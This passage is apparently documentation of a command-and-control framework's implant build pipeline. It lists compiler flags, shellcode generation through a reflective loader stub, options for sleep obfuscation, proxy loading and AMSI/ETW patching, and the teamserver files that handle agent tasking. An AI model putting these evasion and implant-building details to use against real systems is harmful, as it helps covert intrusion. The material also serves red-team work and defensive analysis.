NASM assembles `.x64.asm`/`.x86.asm` files first to `.o` objects
All `.c` sources from `src/core`, `src/crypt`, `src/inject`, `src/asm` plus `src/Demon.c` plus the chosen entry-point file are compiled in one command

Key compiler flags:
```
-Os -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8
-falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w
-falign-labels=1 -fPIC -nostdlib -mwindows
-Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections
```

Debug builds add `-D DEBUG` and omit `-s`/`-nostdlib`.
Service EXE adds `-D SVC_EXE -lntdll`.

### 5. Binary formats

- **EXE / DLL / Service EXE**: compile directly to output file
- **Raw Shellcode**: compile DLL with `-D SHELLCODE`, then prepend `payloads/Shellcode.x64.bin` (the reflective loader stub) — result is position-independent shellcode
- Binary patching (`Patch()`): optionally replaces MZ magic bytes and string literals per profile `Binary {}` config

### Builder constants

```go
FILETYPE_WINDOWS_EXE            = 1
FILETYPE_WINDOWS_SERVICE_EXE    = 2
FILETYPE_WINDOWS_DLL            = 3
FILETYPE_WINDOWS_REFLECTIVE_DLL = 4
FILETYPE_WINDOWS_RAW_BINARY     = 5

SLEEPOBF_NO_OBF  = 0  SLEEPOBF_EKKO = 1  SLEEPOBF_ZILEAN = 2  SLEEPOBF_FOLIAGE = 3
SLEEPOBF_BYPASS_NONE = 0  SLEEPOBF_BYPASS_JMPRAX = 1  SLEEPOBF_BYPASS_JMPRBX = 2
PROXYLOADING_NONE = 0  PROXYLOADING_RTLREGISTERWAIT = 1  RTLCREATETIMER = 2  RTLQUEUEWORKITEM = 3
AMSIETW_PATCH_NONE = 0  AMSIETW_PATCH_HWBP = 1  AMSIETW_PATCH_MEMORY = 2
ARCHITECTURE_X64 = 1  ARCHITECTURE_X86 = 2
```

---

## Key Teamserver-Side Files

| File | Role |
|------|------|
| `teamserver/pkg/common/builder/builder.go` | Full build pipeline, `PatchConfig()`, format/arch selection |
| `teamserver/pkg/common/packer/` | Binary serializer used by `PatchConfig()` |
| `teamserver/cmd/server/agent.go` | Agent registration, task dispatch, command routing to connected agents |
| `teamserver/cmd/server/types.go` | `Teamserver`, `Client`, `Agent` Go structs |
| `teamserver/pkg/handlers/` | HTTP/SMB listener server-side implementations |
| `teamserver/pkg/profile/` | YAOTL config parsing |
